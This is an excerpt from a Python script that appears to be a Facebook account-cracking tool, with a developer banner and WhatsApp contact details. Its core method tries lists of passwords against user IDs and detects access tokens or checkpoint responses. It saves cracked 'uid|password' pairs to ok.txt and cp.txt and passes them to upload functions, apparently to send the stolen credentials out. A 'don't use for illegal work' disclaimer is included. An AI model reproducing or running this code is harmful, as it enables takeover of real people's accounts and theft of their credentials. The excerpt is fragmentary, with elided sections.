...
def helpnote():
	...
	exit(" [*] FACEBOOK : https://www.facebook.com/Mehedihasan1047 ")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801882812173")
	subprocess.check_output(["am", "start", "https://wa.me/+8801882812173"])
...
\033[0;96m #     # ####### #     # ####### ######  ###
 ...
 > \033[0;92mDEVELOPER     : MEHEDI HASAN SHAKIL
 > \033[0;95mFACEBOOK ID   : MEHEDI HASAN 
 > \033[0;41mWHATSAPP      : +8801882812173
 \033[0;96m> YOUTUBE       : Mehedi12am
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MEHEDI] : %s/%s -> \033[0;92m [ MEHEDI-OK:%s ]- \033[0;93m[MAHIN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [MEHEDI-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[MEHEDI-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MEHEDI-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
